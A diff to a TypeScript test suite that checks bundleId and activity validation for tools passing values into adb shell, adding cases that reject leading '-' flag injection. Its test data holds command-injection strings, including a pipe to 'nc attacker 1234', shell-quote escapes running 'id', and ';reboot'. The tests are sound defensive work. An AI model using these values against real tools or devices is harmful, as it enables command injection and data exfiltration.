@@ -34,6 +34,10 @@ describe("bundleId validation — tools that interpolate into adb shell", () => 
     "com.foo | nc attacker 1234",
     "com.foo\nmalicious",
     "com.foo'; id; echo '",
+    // Leading `-` would let bundleId masquerade as an `am`/`cmd package` flag.
+    "--user",
+    "-X",
+    "-foo",
   ];
 
   for (const { name, schema, baseArgs } of toolCases) {
@@ -91,6 +95,15 @@ describe("activity validation — launch-app Android branch", () => {
       udid: "emulator-5554",
       bundleId: "com.example.app",
       activity: ".Main;reboot",
+    });
+    expect(parsed.success).toBe(false);
+  });
+
+  it("rejects an activity that starts with `-` (flag injection)", () => {
+    const parsed = launchAppTool.zodSchema.safeParse({
+      udid: "emulator-5554",
+      bundleId: "com.example.app",
+      activity: "-X",
     });
     expect(parsed.success).toBe(false);
   });
